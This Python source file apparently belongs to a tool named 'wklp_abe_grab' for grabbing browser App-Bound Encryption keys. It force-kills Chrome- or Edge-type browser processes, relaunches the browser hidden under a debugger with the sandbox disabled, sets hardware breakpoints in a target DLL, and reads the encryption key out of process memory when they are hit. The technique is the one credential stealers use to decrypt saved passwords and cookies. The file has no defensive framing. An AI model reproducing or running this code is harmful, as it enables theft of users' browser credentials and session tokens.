import ctypes
import struct
import subprocess
import threading
import time

from wklp_abe_grab.breakpoints import set_hwbps
from wklp_abe_grab.keycheck import extract_key
from wklp_abe_grab.memory import read_mem
from wklp_abe_grab.pe import find_all_leas
from wklp_abe_grab.procs import kill_browser_processes
from wklp_abe_grab.winapi import (
    CREATE_NO_WINDOW,
    DBG_CONTINUE,
    DBG_EXCEPTION_NOT_HANDLED,
    DEBUG_ONLY_THIS,
    EVENT_CREATE_PROCESS,
    EVENT_CREATE_THREAD,
    EVENT_EXCEPTION,
    EVENT_EXIT_PROCESS,
    EVENT_LOAD_DLL,
    EXCEPTION_SINGLE_STEP,
    IGNORED_EXCEPTIONS,
    PROCESS_ALL_ACCESS,
    THREAD_ALL,
    CONTEXT_FULL,
    Context64,
    DebugEvent,
    ProcInfo,
    StartupInfo,
    k32,
)


def _debug_loop(h_proc, pid, dll_names, is_edge, timeout=90):
    bp_addrs = []
    key = None
    threads = {}
    hit_count = {}
    deadline = time.time() + timeout
    ev = DebugEvent()

    while time.time() < deadline:
        if not k32.WaitForDebugEvent(ctypes.byref(ev), 250):
            continue

        code = ev.Code
        tid = ev.Tid
        cur_pid = ev.Pid
        status = DBG_CONTINUE

        if cur_pid != pid:
            k32.ContinueDebugEvent(cur_pid, tid, status)
            continue

        if code in (EVENT_CREATE_PROCESS, EVENT_CREATE_THREAD):
            ht = k32.OpenThread(THREAD_ALL, False, tid)
            if ht:
                threads[tid] = ht
                if bp_addrs:
                    k32.SuspendThread(ht)
                    set_hwbps(ht, bp_addrs)
                    k32.ResumeThread(ht)

        elif code == EVENT_LOAD_DLL:
            base = ev.u.Dll.Base
            if not base:
                k32.ContinueDebugEvent(cur_pid, tid, status)
                continue

            name = ""
            try:
                np = ev.u.Dll.ImageName
                if np:
                    pb = read_mem(h_proc, np, 8)
                    if len(pb) == 8:
                        p2 = struct.unpack_from("<Q", pb)[0]
                        if p2:
                            nb = read_mem(h_proc, p2, 512)
                            enc = "utf-16-le" if ev.u.Dll.Unicode else "utf-8"
                            name = nb.decode(enc, errors="ignore").split(
                                "\x00")[0]
            except Exception:
                pass

            short = name.split("\\")[-1].lower() if name else ""

            if not bp_addrs and dll_names and \
               any(t.lower() in name.lower() for t in dll_names):
                print("    dll %s @ 0x%X" % (short, base))
                leas = find_all_leas(h_proc, base)
                if not leas:
                    print("    marker not found")
                else:
                    print("    found %d LEAs" % len(leas))
                    bp_addrs = leas[:4]
                    for ht in threads.values():
                        k32.SuspendThread(ht)
                        set_hwbps(ht, bp_addrs)
                        k32.ResumeThread(ht)
                    print("    armed %d bps on %d threads" % (
                        len(bp_addrs), len(threads)))

        elif code == EVENT_EXCEPTION:
            exc = ev.u.Exc.Code
            if exc == EXCEPTION_SINGLE_STEP:
                ht = threads.get(tid)
                if not ht:
                    ht = k32.OpenThread(THREAD_ALL, False, tid)
                    if ht:
                        threads[tid] = ht
                if ht:
                    ctx = Context64()
                    ctx.Flags = CONTEXT_FULL
                    k32.GetThreadContext(ht, ctypes.byref(ctx))
                    rip = ctx.Rip
                    if bp_addrs and rip in bp_addrs:
                        idx = bp_addrs.index(rip)
                        hc = hit_count.get(idx, 0) + 1
                        hit_count[idx] = hc
                        k, src = extract_key(h_proc, ctx, is_edge)
                        if k:
                            print("    hit bp[%d] tid=%d key from %s" % (
                                idx, tid, src))
                            key = k
                            k32.ContinueDebugEvent(cur_pid, tid, DBG_CONTINUE)
                            break
                        if hc == 1 or hc % 100 == 0:
                            print("    miss bp[%d] tid=%d count=%d" % (
                                idx, tid, hc))

            elif exc not in IGNORED_EXCEPTIONS:
                status = DBG_EXCEPTION_NOT_HANDLED

        elif code == EVENT_EXIT_PROCESS:
            if cur_pid == pid:
                break

        k32.ContinueDebugEvent(cur_pid, tid, status)

    for ht in threads.values():
        try:
            k32.CloseHandle(ht)
        except Exception:
            pass
    return key


def _run_debug(exe, dlls, is_edge, timeout, out, extra_args, browser_name):
    si = StartupInfo()
    si.cb = ctypes.sizeof(StartupInfo)
    si.flags = 0x1
    si.show = 0
    pi = ProcInfo()

    base_args = ["--no-sandbox", "--disable-gpu", "--no-first-run"]
    if extra_args:
        base_args.extend(extra_args)

    cmd = '"' + exe + '" ' + " ".join(base_args)
    print("    [launch] %s" % cmd)

    if not k32.CreateProcessW(None, cmd, None, None, False,
                              DEBUG_ONLY_THIS, None, None,
                              ctypes.byref(si), ctypes.byref(pi)):
        print("    [launch] create failed err=%d" % k32.GetLastError())
        out["key"] = None
        return

    pid = pi.Pid
    h_full = k32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    h_proc = h_full if h_full else pi.hProcess
    out["pid"] = pid
    print("    [launch] pid=%d" % pid)

    k32.DebugSetProcessKillOnExit(False)

    try:
        out["key"] = _debug_loop(h_proc, pid, dlls, is_edge,
                                  timeout=timeout)
    except Exception as e:
        print("    [loop] exception: %s" % e)
        out["key"] = None

    try:
        k32.DebugActiveProcessStop(pid)
    except Exception:
        pass
    try:
        k32.TerminateProcess(pi.hProcess, 0)
    except Exception:
        pass
    if browser_name:
        kill_browser_processes(browser_name)
    subprocess.call("taskkill /F /PID %d /T" % pid, shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    creationflags=CREATE_NO_WINDOW)
    try:
        k32.CloseHandle(pi.hProcess)
        k32.CloseHandle(pi.hThread)
    except Exception:
        pass
    if h_full:
        try:
            k32.CloseHandle(h_full)
        except Exception:
            pass


def get_app_bound(exe, dlls, kill, is_edge=False, timeout=90,
                  extra_args=None, browser_name=None):
    for img in kill:
        subprocess.call("taskkill /F /IM %s /T" % img, shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        creationflags=CREATE_NO_WINDOW)
    if kill:
        time.sleep(1.2)
    if browser_name:
        kill_browser_processes(browser_name)

    out = {"key": None, "pid": None}
    t = threading.Thread(target=_run_debug,
                         args=(exe, dlls, is_edge, timeout, out),
                         kwargs={"extra_args": extra_args,
                                 "browser_name": browser_name},
                         daemon=True)
    t.start()
    t.join(timeout=timeout + 20)

    if t.is_alive():
        print("    [watchdog] timeout")
        if out.get("pid"):
            subprocess.call("taskkill /F /PID %d /T" % out["pid"],
                            shell=True, stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            creationflags=CREATE_NO_WINDOW)
        return None
    return out["key"]